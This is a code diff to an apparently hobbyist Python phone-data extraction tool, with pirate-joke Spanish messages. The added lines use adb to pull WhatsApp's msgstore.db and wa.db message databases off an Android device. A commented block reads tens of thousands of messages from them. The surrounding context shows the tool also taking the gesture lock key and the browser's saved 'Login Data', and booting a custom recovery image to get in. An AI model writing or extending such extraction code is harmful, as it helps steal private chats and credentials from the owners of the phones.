@@ -26,6 +26,10 @@ def grab_tresure_from_phone():
         os.remove("dump/gesture.key")
     if os.path.exists("dump/Login Data"):
         os.remove("dump/Login Data")
+    if os.path.exists("dump/msgstore.db"):
+        os.remove("dump/msgstore.db")
+    if os.path.exists("dump/wa.db"):
+        os.remove("dump/wa.db")
     print ("[1] Arr!! Attacar ese movil!!")
     os.system("""adb reboot bootloader""")
     os.system("""fastboot boot TWRP/twrp-2.8.7.1-hammerhead.img""")
@@ -37,7 +41,18 @@ def reboot_phone():
 
 def grab_whatssap_from_phone():
     #pillar chats whatsapp
-    print("ARGG Capitann!! Aun no tenemos esta habilidad")
+    print("ARGG!! A por el whassap!!")
+    os.system('''adb pull /data/data/com.whatsapp/databases/msgstore.db dump''')
+    os.system('''adb pull /data/data/com.whatsapp/databases/wa.db dump''')
+    print("Guardado en nuestro barco (carpeta dump) abrir con Sqlite Browser")
+    #con = sqlite3.connect('dump/msgstore.db')
+    #with con:
+    #    cur = con.cursor()
+    #    cur.execute("SELECT `_rowid_`,* FROM `messages`  ORDER BY `timestamp` DESC LIMIT 0, 50000")
+    #    rows = cur.fetchall()
+    #    for row in rows:
+    #        print str(row)
+    #con.close()
 
 def grab_pattern_from_phone():
     #pillar patron de bloqueo
